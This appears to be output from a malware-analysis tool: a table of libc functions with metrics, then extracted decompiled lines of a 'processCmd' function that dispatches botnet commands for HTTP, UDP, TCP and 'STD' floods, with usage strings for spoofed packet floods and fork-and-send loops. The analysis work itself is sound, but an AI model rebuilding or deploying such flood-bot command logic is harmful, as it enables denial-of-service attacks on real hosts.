__GI___glibc_strerror_r                           |3   |200     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_rfill                                     |2   |201     |0             |0           |
----------------------------------------------------------------------------------------------
htonl                                             |1   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__errno_location                                  |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_write                                      |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_execve                                       |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_close                                      |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
chdir                                             |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
dup2                                              |3   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__sigaddset                                       |0   |203     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_rt_sigaction                            |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
strtol                                            |2   |198     |0             |0           |
----------------------------------------------------------------------------------------------
frame_dummy                                       |0   |203     |0             |0           |
----------------------------------------------------------------------------------------------
ntohl                                             |2   |199     |0             |0           |
----------------------------------------------------------------------------------------------
usleep                                            |2   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_void                             |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
call___do_global_ctors_aux                        |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_question                                 |3   |215     |0             |0           |
----------------------------------------------------------------------------------------------
getrlimit                                         |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
contains_fail                                     |1   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseeko64                                     |3   |278     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fwrite_unlocked                              |4   |258     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_trans2w_o                                 |1   |365     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_brk                                          |1   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__do_global_ctors_aux                             |1   |214     |0             |0           |
----------------------------------------------------------------------------------------------
contains_success                                  |1   |198     |0             |0           |
----------------------------------------------------------------------------------------------
read_until_response                               |6   |206     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_exit                                         |0   |212     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_sbrk                                         |1   |250     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcgetattr                                    |1   |213     |0             |0           |
----------------------------------------------------------------------------------------------
__bsd_signal                                      |2   |261     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_getpagesize                                  |0   |200     |0             |0           |
----------------------------------------------------------------------------------------------
init_rand                                         |1   |202     |0             |0           |
----------------------------------------------------------------------------------------------
_promoted_size                                    |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__decode_header                                   |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fputs_unlocked                               |2   |206     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_tcsetattr                                    |0   |327     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_mempcpy                                      |7   |199     |0             |0           |
----------------------------------------------------------------------------------------------
_fini                                             |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_READ                                      |3   |234     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_nanosleep                                  |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__syscall_error                                   |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
kill                                              |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__heap_link_free_area_after                       |4   |204     |0             |0           |
----------------------------------------------------------------------------------------------
getegid                                           |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
strcpy                                            |2   |211     |0             |0           |
----------------------------------------------------------------------------------------------
memmove                                           |2   |461     |0             |0           |
----------------------------------------------------------------------------------------------
sigemptyset                                       |1   |199     |0             |0           |
----------------------------------------------------------------------------------------------
atol                                              |2   |198     |0             |0           |
----------------------------------------------------------------------------------------------
setstate                                          |1   |209     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_getpid                                     |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_read                                       |1   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__vfork                                           |0   |201     |0             |0           |
----------------------------------------------------------------------------------------------
__pthread_return_0                                |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_toupper                                      |2   |201     |0             |0           |
----------------------------------------------------------------------------------------------
htons                                             |1   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_strtok                                       |3   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_sigaction                                  |3   |215     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_setsid                                       |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__stdio_seek                                      |3   |209     |0             |0           |
----------------------------------------------------------------------------------------------
geteuid                                           |0   |208     |0             |0           |
----------------------------------------------------------------------------------------------
__socketcall                                      |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
strtok_r                                          |1   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__encode_header                                   |3   |213     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_memset                                       |3   |356     |0             |0           |
----------------------------------------------------------------------------------------------
getc_unlocked                                     |2   |341     |0             |0           |
----------------------------------------------------------------------------------------------
__libc_fcntl                                      |2   |218     |0             |0           |
----------------------------------------------------------------------------------------------
setstate_r                                        |2   |230     |0             |0           |
----------------------------------------------------------------------------------------------
bcopy                                             |4   |198     |0             |0           |
----------------------------------------------------------------------------------------------
initstate                                         |3   |202     |0             |0           |
----------------------------------------------------------------------------------------------
feof                                              |1   |222     |0             |0           |
----------------------------------------------------------------------------------------------
__length_question                                 |2   |207     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_wcrtomb                                      |3   |210     |0             |0           |
----------------------------------------------------------------------------------------------
_ppfs_prepargs                                    |2   |208     |0             |0           |
----------------------------------------------------------------------------------------------
_store_inttype                                    |1   |220     |0             |0           |
----------------------------------------------------------------------------------------------
__GI_fseek                                        |1   |199     |0             |0           |
----------------------------------------------------------------------------------------------
_fp_out_narrow                                    |4   |251     |0             |0           |
----------------------------------------------------------------------------------------------
_stdio_init                                       |1   |202     |0             |0           |
----------------------------------------------------------------------------------------------
uppercase                                         |1   |217     |0             |0           |
----------------------------------------------------------------------------------------------
ntohs                                             |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
unknown_0                                         |2   |0       |0             |0           |
----------------------------------------------------------------------------------------------
call_frame_dummy                                  |0   |199     |0             |0           |
----------------------------------------------------------------------------------------------
__GI___h_errno_location                           |0   |198     |0             |0           |
----------------------------------------------------------------------------------------------
__sigismember                                     |2   |200     |0             |0           |
----------------------------------------------------------------------------------------------
================================================================================
========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
================================================================================
=================FUNCTION : processCmd ===================
++++++++ FUNCTION START 13865
++++++++ FUNCTION END 18457
++++++++ FUNCTION LENGTH 4592
    if (__GI_strcoll((char *)*a2, (int32_t)"PING") == 0) {
        Rootsprintf(v191, (int32_t)"PONG!", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                kill(v249, 9);
                Rootsprintf(v191, (int32_t)"REP STOPPING!", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                    int32_t v259 = __libc_fork(); // 0x10005b08
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                        if (listFork() == 0) {
                                            Rootsprintf(v191, (int32_t)"HTTP %s Flooding %s:%d for %d seconds", v195);
                                            sendHTTP(v221, v195, (int16_t)(v222 % 0x10000), v194, v193, v224);
                                            if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                        return Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                            int32_t v265 = listFork(); // 0x10006048
                                                                                                sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") != 0) {
                                                                                                                        v263 = listFork();
                                                                                                                            sendSTD(v255, v256, v257);
                                                                                                                                while (true) {
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                        while (true) {
                                                                                                        v264 = Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                            while (true) {
                                                                                                                            result3 = Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                            result3 = Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                                    sendTCP(v196, v239, v240, v241, v242, v198, v199);
                                                                                                                                                v263 = listFork();
                                                                                                                                                    sendSTD(v255, v256, v257);
                                                                                                                                                        while (true) {
                                                                                                                                                                int32_t v272 = __libc_getpid(); // 0x10006574
                                                                                                                                                                    v270 = kill(v273, 9);
                                                                                                                                                while (true) {
                                                                                                                                                    if (listFork() == 0) {
                                                                                                                                                        sendSTD(v250, v256, v257);
                                                                                                                                                    while (true) {
                                                                                                                                                while (true) {
                                                                                                                                v264 = Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                                    while (true) {
                                                                                                                                        v263 = listFork();
                                                                                                                                            sendSTD(v255, v256, v257);
                                                                                                                                                while (true) {
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                                        while (true) {
                                                                                                                        v264 = Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                            while (true) {
                                                                                                result3 = Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendUDP(v197, v227, v228, v229, v230, v201, v200);
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                        result3 = Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                        result3 = Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                    v263 = listFork();
                                                                                                                                        sendSTD(v255, v256, v257);
                                                                                                                                            while (true) {
                                                                                                                                    while (true) {
                                                                                                                                        if (listFork() == 0) {
                                                                                                                                    while (true) {
                                                                                                                    v264 = Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                        while (true) {
                                                                                            Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                v263 = listFork();
                                                                                                                    sendSTD(v255, v256, v257);
                                                                                                                        while (true) {
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                while (true) {
                                                                                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                    while (true) {
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                            if (listFork() == 0) {
                                                                                sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v255, v256, v257);
                                                                                                    while (true) {
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                                            while (true) {
                                                                            Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                while (true) {
                                                    Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v255, v256, v257);
                                                                                while (true) {
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                                        while (true) {
                                                        Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                            while (true) {
                            if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                        Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v255, v256, v257);
                                                                                                                                    while (true) {
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                            while (true) {
                                                                                                            Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                while (true) {
                                                                                    Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                        if (listFork() == 0) {
                                                                                                            sendSTD(v255, v256, v257);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                        Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                        Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                    if (listFork() == 0) {
                                                                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v255, v256, v257);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                            Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                if (listFork() == 0) {
                                                                                                    sendSTD(v255, v256, v257);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                            if (listFork() == 0) {
                                                                sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendSTD(v255, v256, v257);
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                                            Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                    Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                        if (listFork() == 0) {
                                                            sendSTD(v255, v256, v257);
                                                            while (true) {
                                                                if (listFork() == 0) {
                                        Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                if (listFork() == 0) {
                                    Rootsprintf(v191, (int32_t)"HTTP %s Flooding %s:%d for %d seconds", v195);
                                    sendHTTP(v221, v195, (int16_t)(v222 % 0x10000), v194, v193, v224);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                                                Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                    if (listFork() == 0) {
                                                                                        sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                        Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                        Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendSTD(v255, v256, v257);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                            Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendSTD(v255, v256, v257);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                            if (listFork() == 0) {
                                                                                sendUDP(v226, v227, v228, v229, v230, v201, v200);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                                Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                            if (listFork() == 0) {
                                                                                                                sendTCP(v238, v239, v240, v241, v242, v198, v199);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v255, v256, v257);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                    Rootsprintf(v191, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                                        if (listFork() == 0) {
                                                                                                            sendSTD(v255, v256, v257);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        Rootsprintf(v191, (int32_t)"STD <target> <port> <time>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                                                                while (true) {
                                                                                    if (listFork() == 0) {
                                        Rootsprintf(v191, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
                                        if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
